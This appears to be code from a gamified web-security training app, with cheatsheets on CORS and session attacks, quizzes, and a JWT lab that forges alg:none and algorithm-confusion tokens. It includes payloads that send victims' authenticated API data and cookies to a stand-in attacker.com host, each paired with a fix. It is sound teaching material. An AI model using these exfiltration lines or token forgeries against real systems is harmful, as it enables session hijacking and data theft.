  {title:'Exploit payload',cmd:"fetch('https://target.com/api/user',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('http://attacker.com/?d='+JSON.stringify(d)))",note:'Runs on attacker.com — reads victim\'s authenticated response and exfils it'},
  {title:'Wildcard + credentials',cmd:'* with Allow-Credentials: true',note:'Browsers reject this combination — but the intent is dangerous; never combine both'},
  {title:'Subdomain misconfiguration',cmd:'ACAO: https://trusted.victim.com',note:'XSS on trusted.victim.com + this CORS config = cross-origin API read'},
  {title:'Fix: explicit allowlist',cmd:"if(ALLOWED_ORIGINS.includes(origin)) res.setHeader('ACAO', origin)",note:'Exact-match against pre-registered origins. Never use startsWith or contains.'},
 ],
 quiz:[
  {q:'Response: Access-Control-Allow-Origin: https://attacker.com + Allow-Credentials: true. JS on attacker.com can:',o:['Make requests but not read them','Read full authenticated responses including cookie data','Only GET requests','Nothing'],a:1,e:'Matching origin + Allow-Credentials = browser permits JS to read the entire authenticated response.'},
  {q:'ACAO: null + Allow-Credentials: true. Exploit vector:',o:['None','Sandboxed iframe on attacker page sends Origin:null and reads credentialed responses','Localhost only','Double visit required'],a:1,e:'<iframe sandbox="allow-scripts"> sends Origin: null — whitelisting null grants this attacker context full read access.'},
  {q:'Why does CORS not prevent CSRF?',o:['It does prevent CSRF','CORS controls reading responses — requests still fire regardless of CORS policy','Only for GET','CORS and CSRF are the same'],a:1,e:'CSRF is about sending requests. CORS is about reading responses. A request fires even with CORS blocking the response.'},
 ]},
];

{n:13,id:'session',title:'Session Security',tracks:['AUTH'],
 tag:'fixation · hijacking · HttpOnly · rotation · prediction',

 labType:'session',
 cheat:[
  {title:'Session fixation',cmd:'Set-Cookie: session=KNOWN_VALUE before login',note:'If session ID doesn\'t rotate at login, attacker sets a known ID and waits'},
  {title:'XSS cookie theft',cmd:"new Image().src='http://attacker.com/?c='+document.cookie",note:'Works only if HttpOnly flag is absent. HttpOnly blocks JS cookie access.'},
  {title:'Weak token check',cmd:"echo -n 'admin1718000000' | md5sum",note:'Predictable tokens (username+timestamp) are forgeable — use CSPRNG'},
  {title:'Cookie flags',cmd:'Set-Cookie: session=X; HttpOnly; Secure; SameSite=Strict; Path=/',note:'All four flags together on session cookies. Missing any one creates a gap.'},
  {title:'Session fixation fix',cmd:'session_regenerate_id(true) immediately after login',note:'Generate new random session ID at every privilege change including login'},
  {title:'Network sniffing',cmd:'Wireshark filter: http.cookie contains "session"',note:'HTTP (no TLS) sessions visible on network. Always enforce HTTPS.'},
 ],
 quiz:[

window.decodeJWT=function(){
  const t=(document.getElementById('jwt-in').value||'').trim();
  const parts=t.split('.');
  if(parts.length<2){document.getElementById('jwt-out').textContent='Invalid JWT format';return;}
  const dec=s=>{try{return JSON.stringify(JSON.parse(atob(s.replace(/-/g,'+').replace(/_/g,'/'))),null,2);}catch{return 'decode error';}};
  document.getElementById('jwt-header').innerHTML=`<span class="a">${dec(parts[0])}</span>`;
  document.getElementById('jwt-payload').innerHTML=`<span class="g">${dec(parts[1])}</span>`;
  document.getElementById('jwt-out').textContent='Token decoded. Now run an attack.';
  addXP('jwt_decode',5);
};
window.jwtAttack=function(type){
  const t=(document.getElementById('jwt-in').value||'').trim();
  const parts=t.split('.');
  const dec=s=>{try{return JSON.parse(atob(s.replace(/-/g,'+').replace(/_/g,'/')));}catch{return {};}};
  const enc=o=>btoa(JSON.stringify(o)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
  const out=document.getElementById('jwt-out');
  const res=document.getElementById('jwt-result');
  if(type==='none'){
    const hdr={alg:'none',typ:'JWT'};
    const pay=dec(parts[1]||''); pay.role='admin'; pay.sub='admin_1';
    const forged=enc(hdr)+'.'+enc(pay)+'.';
    out.innerHTML=`<span class="r">ATTACK: alg:none</span>\n<span class="dim">────────────────────────────</span>\n<span class="a">Forged token (no signature):</span>\n<span class="v">${forged}</span>\n\n<span class="g">→ Server accepts if it doesn't enforce algorithm</span>\n<span class="r">→ Role claim changed to: admin</span>`;
    res.innerHTML=`<div class="panel danger"><h4>What happened</h4><p style="font-size:13px">Algorithm set to "none" + signature stripped. Role elevated to admin. If server accepts: <b>full authentication bypass</b>. Fix: hardcode expected algorithm server-side — never read alg from token.</p></div>`;
    addXP('jwt_none',20);
  } else if(type==='confusion'){
    const hdr={alg:'HS256',typ:'JWT'};
    const pay=dec(parts[1]||''); pay.role='admin';
    const forged=enc(hdr)+'.'+enc(pay)+'.HMAC_SIGNED_WITH_SERVER_PUBLIC_KEY';
    out.innerHTML=`<span class="r">ATTACK: RS256 → HS256 Algorithm Confusion</span>\n<span class="dim">────────────────────────────────────────</span>\n<span class="a">1. Fetch public key from /.well-known/jwks.json</span>\n<span class="a">2. Change alg: RS256 → HS256</span>\n<span class="a">3. Sign with public key bytes as HMAC secret</span>\n\n<span class="v">Forged: ${forged}</span>\n\n<span class="g">→ If library mishandles alg switch, verification</span>\n<span class="g">  uses public key as HMAC secret — it matches!</span>`;
    res.innerHTML=`<div class="panel danger"><h4>Why it works</h4><p style="font-size:13px">RS256 uses asymmetric keys. HS256 uses symmetric. If you tell the library to verify as HS256, it expects a symmetric secret. You provide the server's PUBLIC KEY (which is public!). The library computes HMAC-SHA256(header.payload, publicKey) and verifies — it matches what you signed. Fix: Never allow the token to specify the algorithm.</p></div>`;
    addXP('jwt_confusion',25);
  } else if(type==='edit'){
    const pay=dec(parts[1]||''); const orig=JSON.stringify(pay);
    pay.role='admin'; pay.sub='admin_1'; pay.exp=Math.floor(Date.now()/1000)+86400*365;
    out.innerHTML=`<span class="a">EDIT CLAIMS</span>\n<span class="dim">─────────────</span>\n<span class="r">Before: ${orig}</span>\n<span class="g">After:  ${JSON.stringify(pay)}</span>\n\n<span class="a">New payload: ${enc(pay)}</span>\n\n<span class="dim">Note: signature is now invalid unless you know the secret</span>\n<span class="dim">→ Combine with alg:none or algorithm confusion to forge valid signature</span>`;
    addXP('jwt_edit',10);
  }
};

  <div class="h1">17 Attack Labs</div>
  <div class="lede">Each lab is a simulated vulnerable target. No setup needed — just attack.</div>
  <div class="spine" style="margin-top:24px">${PHASES.map(p=>{
    const acc=accentOf(p.tracks);const xp=S.xp['phase_'+p.id]||0;
    return `<div class="node" style="--accent:${acc}" onclick="go('phase',{pid:'${p.id}',ptab:'lab'})">
      <span class="labpill">LAB</span>
      <div class="node__n">${String(p.n).padStart(2,'0')} &nbsp; <span class="chip t-${p.tracks[0]}">${p.tracks[0]}</span></div>
      <div class="node__t">${p.title}</div>
      <div class="node__tag">${p.tag}</div>
      <div class="node__bar" style="margin-top:10px"><i style="width:${xp?'100':'0'}%"></i></div>
    </div>`;}).join('')}</div>`;
}

/* PHASE (Lab + Cheatsheet + Quiz tabs) */
function viewPhase(app){
  const p=PHASES.find(x=>x.id===S.pid)||PHASES[0];
  const acc=accentOf(p.tracks);
  const tab=S.ptab||'lab';
  const prev=PHASES[PHASES.indexOf(p)-1],next=PHASES[PHASES.indexOf(p)+1];
  let body='';
  if(tab==='lab'){
    const fn=labMap[p.labType];
    body=fn?fn():`<div class="panel warn" style="padding:24px"><p>Lab coming soon for this module.</p></div>`;
    addXP('phase_'+p.id,5);
  } else if(tab==='ref'){
    body=`<div class="cheat" style="--accent:${acc}">${(p.cheat||[]).map(c=>`<div class="cheat__item"><b style="font-size:14px">${c.title}</b><code onclick="cp(this)">${c.cmd}</code><p>${c.note}</p></div>`).join('')}</div>`;
  } else {
    body=buildQuizHTML(p.quiz||[],p.id,acc);
  }
  app.innerHTML=`<div class="crumb"><a onclick="go('map')">Map</a><span>›</span><span>${p.title}</span></div>
  <div class="ph"><div><div style="display:flex;gap:8px;margin-bottom:8px">${p.tracks.map(t=>`<span class="chip t-${t}">${t}</span>`).join('')}</div><div class="ph__t" style="color:${acc}">${String(p.n).padStart(2,'0')} — ${p.title}</div><div class="ph__sub">${p.tip}</div></div></div>
  <div class="tabrow">${['lab','ref','quiz'].map(t=>`<button style="--accent:${acc}" ${tab===t?'aria-current="true"':''} onclick="go('phase',{pid:'${p.id}',ptab:'${t}'})">${t==='lab'?'◉ Lab':t==='ref'?'⌘ Cheatsheet':'✦ Quiz'}</button>`).join('')}</div>
  ${body}
  <div style="display:flex;justify-content:space-between;margin-top:24px;flex-wrap:wrap;gap:10px">
    ${prev?`<button class="btn btn--g btn--sm" onclick="go('phase',{pid:'${prev.id}',ptab:'lab'})">← ${prev.title}</button>`:'<span></span>'}
    ${next?`<button class="btn btn--sm" onclick="go('phase',{pid:'${next.id}',ptab:'lab'})">${next.title} →</button>`:'<span></span>'}
  </div>`;
}

/* QUIZ */
function buildQuizHTML(quiz,pid,acc){
  const state=S.qs||{};
  return `<div>${quiz.map((q,i)=>{
    const ans=state[pid+'_'+i];
    return `<div class="qcard"><div class="qcard__n">Question ${i+1}</div><div class="qcard__q">${q.q}</div>
    ${q.o.map((o,oi)=>{let ds='';if(ans!==undefined){ds=oi===q.a?'correct':(oi===ans?'wrong':'');}
    return `<button class="opt" data-s="${ds}" ${ans!==undefined?'disabled':''} onclick="ansQ('${pid}',${i},${oi},${q.a},'${encodeURIComponent(q.e)}')">${o}</button>`;}).join('')}
    ${ans!==undefined?`<div class="explain"><b>Explain</b>${q.e}</div>`:''}
    </div>`;}).join('')}</div>`;
}
window.ansQ=function(pid,qi,chosen,correct,enc){
  if(!S.qs)S.qs={};
  S.qs[pid+'_'+qi]=chosen;
  if(chosen===correct)addXP('q_'+pid+'_'+qi,10);
  go('phase',{pid,ptab:'quiz'});
};

/* GLOBAL QUIZ */
function viewQuiz(app){
  if(!S.gqs||!S.gqs.length){
    let pool=[];
    PHASES.forEach(p=>(p.quiz||[]).forEach((q,i)=>pool.push({...q,pid:p.id,qi:i,ptitle:p.title})));
    for(let i=pool.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[pool[i],pool[j]]=[pool[j],pool[i]];}
    S.gqs=pool.slice(0,20).map(q=>({...q,ans:null}));
  }
  const correct=S.gqs.filter(q=>q.ans===q.a).length;
  const answered=S.gqs.filter(q=>q.ans!==null).length;
  app.innerHTML=`<div class="eyebrow" style="margin-bottom:8px">Global Quiz</div><div class="h1">Knowledge Check</div>
  <div class="score" style="margin-top:18px"><span>Score: <b>${correct}/${answered}</b> of ${S.gqs.length}</span><button class="miniretry" onclick="S.gqs=[];go('quiz')">New Quiz</button></div>
  ${S.gqs.map((q,i)=>`<div class="qcard"><div class="qcard__n">Q${i+1} · ${q.ptitle}</div><div class="qcard__q">${q.q}</div>
  ${q.o.map((o,oi)=>{let ds='';if(q.ans!==null){ds=oi===q.a?'correct':(oi===q.ans?'wrong':'');}
  return `<button class="opt" data-s="${ds}" ${q.ans!==null?'disabled':''} onclick="ansGQ(${i},${oi})">${o}</button>`;}).join('')}
  ${q.ans!==null?`<div class="explain"><b>Explain</b>${q.e}</div>`:''}
  </div>`).join('')}`;
}
window.ansGQ=function(i,oi){S.gqs[i].ans=oi;if(oi===S.gqs[i].a)addXP('gq_'+i,10);go('quiz');};

/* CASES */
function viewCase(app){
  if(!S.caseId){
    app.innerHTML=`<div class="eyebrow" style="margin-bottom:8px">Case Files</div><div class="h1">Attack Chain Scenarios</div>
    <div class="lede">Work through real-world pentest decisions. One wrong call changes everything.</div>
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px;margin-top:24px">
    ${CASES.map(c=>`<div class="node" style="--accent:var(--blood);cursor:pointer" onclick="go('case',{caseId:'${c.id}',caseNode:0})"><div class="labpill">LIVE</div><div class="node__t">${c.title}</div><div class="node__tag">${c.brief}</div><div class="node__tag" style="margin-top:8px;color:var(--blood)">${c.nodes.length} decision points →</div></div>`).join('')}
    </div>`;return;
  }
  const cas=CASES.find(c=>c.id===S.caseId);
  const done=S.caseNode>=cas.nodes.length;
  const node=done?null:cas.nodes[S.caseNode];
  app.innerHTML=`<div class="crumb"><a onclick="go('case',{caseId:null,caseNode:0})">Cases</a><span>›</span><span>${cas.title}</span></div>
  <div style="font-family:var(--mono);font-size:11px;color:var(--ash);margin-bottom:16px">Brief: ${cas.brief}</div>
  ${done?`<div class="casenode" style="box-shadow:7px 7px 0 var(--volt)"><div class="clock">CASE CLOSED</div><p style="margin-top:10px;font-size:15px">You completed <b>${cas.title}</b>. Every correct call earned XP.</p><button class="btn" style="margin-top:16px" onclick="go('case',{caseId:null})">Back to Cases</button></div>`:
  `<div class="casenode"><div class="clock">STEP ${S.caseNode+1} OF ${cas.nodes.length}</div><p style="margin-top:12px;font-size:15px;line-height:1.5">${node.t}</p>
  ${node.choices.map((c,i)=>`<button class="choice" onclick="pickCase(${i})">${String.fromCharCode(65+i)}. ${c}</button>`).join('')}
  <div id="casefb"></div></div>`}`;
}
window.pickCase=function(i){
  const cas=CASES.find(c=>c.id===S.caseId);const node=cas.nodes[S.caseNode];const ok=i===node.correct;
  if(ok)addXP('case_'+S.caseId+'_'+S.caseNode,25);
  document.querySelectorAll('.choice').forEach(b=>b.disabled=true);
  document.getElementById('casefb').innerHTML=`<div class="fb fb-${ok?'g':'b'}" style="margin-top:14px"><b>${ok?'CORRECT':'WRONG'}</b>${ok?node.fb.good:node.fb.bad}</div>
  <button class="btn" style="margin-top:14px" onclick="go('case',{caseId:'${S.caseId}',caseNode:${S.caseNode+1}})">${S.caseNode+1<cas.nodes.length?'Next Step →':'Close Case'}</button>`;
};
